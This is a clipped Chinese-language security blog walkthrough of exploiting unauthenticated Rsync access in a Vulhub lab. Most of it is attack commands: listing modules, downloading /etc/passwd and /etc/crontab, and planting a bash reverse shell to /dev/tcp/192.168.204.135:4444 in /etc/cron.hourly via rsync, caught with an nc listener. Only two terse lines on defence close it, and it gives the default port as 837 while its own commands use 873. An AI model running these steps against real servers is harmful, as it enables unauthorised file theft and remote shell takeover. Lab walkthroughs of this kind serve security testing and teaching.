---
title: Rsync 未授权访问
url: https://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247491292&idx=1&sn=ba2c3c69472b0d6374358c388d58cc7d&chksm=cf62e5d4f8156cc2e468f471fbd8c063aefdd490d27f4037e4cf05690f060442cfe088b16b26&mpshare=1&scene=1&srcid=0314itbr9CfQ9MyBjrMnXMzJ&sharer_shareinfo=1d61dc4744f47bcfee1d44f6e95258d7&sharer_shareinfo_first=1d61dc4744f47bcfee1d44f6e95258d7#rd
clipped_at: 2024-03-31 16:04:07
category: temp
tags: 
 - mp.weixin.qq.com
---


# Rsync 未授权访问

#### 漏洞简介

Rsync(Remote Sync) 是一个用于文件和目录同步的开源工具，广泛用于 Linux 和 Unix 系统中，它通过比较源文件和目标文件的差异只传输变化的部分，实现高效的增量备份和文件同步，Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权就会触发隐患，Rsync 的默认端口为 837

#### 环境搭建

这里我们使用 Vulhub 来构建环境

```plain
docker-compose up -d
```

#### 漏洞检测

```plain
#命令格式
rsync rsync://{target_ip}/

#执行示例
rsync rsync://192.168.204.191:873/
rsync rsync://192.168.204.191:873/src
```

![图片](assets/1711872247-c794c1bee35bb5cf0cde361756583a6f.webp)

#### 文件下载

任意文件下载

```plain
rsync rsync://192.168.204.191:873/src/etc/passwd ./
```

![图片](assets/1711872247-b19aed0fba2b13eed3cd1070bc8871e7.webp)

#### 反弹 Shell

通过使用 rsync 反弹 shell

```plain
# 下载 crontab 配置文件
rsync rsync://192.168.204.191:873/src/etc/crontab ./


该环境 crontab 中的以下内容表示每小时的第 17 分钟执行 run-parts --report /etc/cron.hourly
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

![图片](assets/1711872247-d9ff065caec2000878d4b9fef8b52ee7.webp)

随后我们写入 bash 并赋权：

```plain
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.204.135/4444 0>&1
```

![图片](assets/1711872247-9b495b33d20b871b165cd1accc2eea0e.webp)

```plain
chmod 777
```

![图片](assets/1711872247-8bd51bfee31b77f8359082030cabdc6d.webp)

随后我们将文件上传至/etc/cron.hourly

```plain
rsync -av nc rsync://192.168.204.191:873/src/etc/cron.hourly
```

![图片](assets/1711872247-f677520e6be2f6a63e8cc1866df2fec0.webp)

```plain
# 本地监听 4444
nc -lnvp 4444
```

![图片](assets/1711872247-d543f3e93bf599a319000114589d692d.webp)

反弹成功：

![图片](assets/1711872247-7409138208c1054d347e6565291fdbc7.webp)

#### 防御手段 

-   数据加密传输等
    

-   访问控制：控制接入源 IP